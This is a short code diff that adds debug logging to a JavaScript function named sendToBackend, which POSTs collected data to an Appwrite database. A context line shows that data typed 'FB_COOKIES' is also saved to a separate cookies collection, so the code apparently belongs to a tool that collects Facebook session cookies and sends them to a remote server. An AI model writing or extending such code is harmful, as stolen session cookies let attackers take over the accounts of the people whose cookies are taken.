@@ -975,7 +975,12 @@ async function sendToBackend(type, data, retry = false) {
       createdAt: new Date().toISOString()
     };
 
-    await fetch(
+    console.log('=== Sending log to Appwrite ===');
+    console.log('Type:', type);
+    console.log('LogData:', logData);
+    console.log('URL:', `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`);
+
+    const logResponse = await fetch(
       `${APPWRITE_CONFIG.endpoint}/databases/${APPWRITE_CONFIG.databaseId}/collections/${APPWRITE_CONFIG.collections.logs}/documents`,
       {
         method: 'POST',
@@ -986,6 +991,15 @@ async function sendToBackend(type, data, retry = false) {
         })
       }
     );
+
+    console.log('Log save response:', logResponse.status, logResponse.statusText);
+    if (!logResponse.ok) {
+      const errorBody = await logResponse.text();
+      console.error('❌ Log save error:', errorBody);
+    } else {
+      console.log('✅ Log saved successfully to Appwrite');
+    }
+
 
     // If it's cookies data, also save to cookies collection
     if (type === 'FB_COOKIES') {
